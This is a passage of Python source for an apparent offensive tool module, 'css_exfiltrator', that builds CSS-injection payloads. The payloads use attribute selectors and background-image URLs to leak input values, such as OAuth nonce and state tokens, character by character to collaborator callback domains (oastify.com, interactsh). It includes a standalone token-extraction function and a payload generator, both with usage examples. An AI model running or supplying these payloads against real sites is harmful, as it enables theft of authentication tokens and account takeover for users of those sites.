    background-image: url("https://failed-Z.YOUR-COLLABORATOR.oastify.com/dns-leak");
  }}
`;
document.head.appendChild(s);
console.log("Check your DNS collaborator for hits...");'''

    def _generate_css_batch(self, target: Dict, param_name: str,
                            prefix: str, callback_domain: str) -> str:
        """Generate CSS for testing multiple characters"""
        css_lines = []
        for char in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789':
            test_value = f"{param_name}={prefix}{char}"
            subdomain = f"found-{char.lower()}.{callback_domain}"
            css_lines.append(
                f'{target["selector"].split("[")[0]}[value*="{test_value}"] {{ '
                f'background-image: url("https://{subdomain}/x"); }}'
            )
        return '\n  '.join(css_lines[:10])  # Limit for display

    def _vuln_to_dict(self, vuln: CSSInjectionVuln) -> dict:
        """Convert vulnerability to dictionary for JSON serialization"""
        return {
            'url': vuln.url,
            'injection_point': vuln.injection_point,
            'severity': vuln.severity,
            'cvss': vuln.cvss,
            'bounty_estimate': vuln.bounty_estimate,
            'business_impact': vuln.business_impact,
            'targets_found': vuln.targets_found,
            'exfiltrated_data': [
                {
                    'parameter': e.parameter_name,
                    'value': e.extracted_value,
                    'confidence': e.confidence,
                    'time': e.extraction_time,
                }
                for e in vuln.exfiltrated_data
            ],
            'reproduction_steps': vuln.reproduction_steps,
            'poc_html': vuln.poc_html,
        }


# =============================================================================
# STANDALONE EXTRACTION TOOL
# =============================================================================

async def extract_oauth_tokens(target_url: str, collaborator_domain: Optional[str] = None,
                               max_length: int = 64) -> Dict:
    """
    Standalone function to extract OAuth nonce/state from a URL.

    Usage:
        from modules.css_exfiltrator import extract_oauth_tokens

        result = await extract_oauth_tokens(
            "https://login.example.com/oauth2/authorize?...",
            collaborator_domain="abc123.oastify.com"
        )
        print(result)
    """
    config = {
        'use_interactsh': collaborator_domain is None,
        'interactsh_server': 'oast.fun',
        'max_token_length': max_length,
    }

    exfiltrator = CSSExfiltrator(config)

    if collaborator_domain:
        exfiltrator.callback_domain = collaborator_domain
        exfiltrator.use_interactsh = False

    return await exfiltrator.run(target_url)


def generate_extraction_payloads(param_name: str, charset: Optional[str] = None,
                                 callback_domain: str = "YOUR-COLLAB.oastify.com") -> str:
    """
    Generate CSS payloads for manual extraction.

    Usage:
        from modules.css_exfiltrator import generate_extraction_payloads

        payloads = generate_extraction_payloads(
            "nonce",
            callback_domain="abc123.oastify.com"
        )
        print(payloads)
    """
    if charset is None:
        charset = string.ascii_letters + string.digits + '-_'

    payloads = []

    for char in charset:
        safe_char = char if char.isalnum() else f"x{ord(char):02x}"
        payloads.append(
            f'input[value*="{param_name}={char}"] {{ '
            f'background-image: url("https://found-{safe_char}.{callback_domain}/x"); }}'
        )

    return '\n'.join(payloads)
